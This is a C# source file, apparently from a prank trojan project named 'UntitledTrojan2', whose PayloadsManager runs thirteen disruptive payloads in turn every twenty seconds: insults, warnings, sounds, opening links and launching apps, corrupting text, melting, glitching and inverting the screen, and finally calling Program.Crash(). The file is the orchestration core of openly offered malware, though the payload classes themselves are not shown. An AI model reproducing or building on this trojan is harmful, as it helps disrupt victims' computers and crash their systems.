using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan2.Tools;

namespace UntitledTrojan2.Payloads
{
    internal static class PayloadsManager
    {
        public static string payload = "None";

        internal static async Task Start()
        {
            //new PayloadsClass.PayloadText().OnTick(100000);
            payload = "Amogus (0)";
            new PayloadsClass.Amogus().OnTick(100000);
            await Task.Delay(20000);
            payload = "Insults (1)";
            Insulting.ShowInsult();
            await Task.Delay(20000);
            payload = "Warn (2)";
            new PayloadsClass.Warn().OnTick(100000);
            await Task.Delay(20000);
            payload = "Sounds (3)";
            new PayloadsClass.Sounds().OnTick(100000);
            await Task.Delay(20000);
            payload = "Warn Cursor (4)";
            new PayloadsClass.WarnCursor().OnTick(100000);
            await Task.Delay(20000);
            payload = "Links (5)";
            if (!Form1.Harmless)
                new PayloadsClass.Links().OnTick(100000);
            await Task.Delay(20000);
            payload = "Start Apps (6)";
            if (!Form1.Harmless)
                new PayloadsClass.StartApps().OnTick(100000);
            await Task.Delay(20000);
            payload = "Text Fucker (7)";
            new PayloadsClass.TextFucker().OnTick(100000);
            await Task.Delay(20000);
            payload = "Melter (8)";
            new PayloadsClass.Melter().OnTick(100000);
            await Task.Delay(20000);
            payload = "Glitch (9)";
            new PayloadsClass.Glitch().OnTick(100000);
            await Task.Delay(20000);
            payload = "Invert (10)";
            new PayloadsClass.Invert().OnTick(100000);
            await Task.Delay(20000);
            payload = "Recursive (11)";
            new PayloadsClass.Recursive().OnTick(100000);
            await Task.Delay(20000);
            payload = "Screen Glitch (12)";
            new PayloadsClass.ScreenGlitch().OnTick(100000);
            await Task.Delay(20000);
            Program.Crash();
        }
    }
}
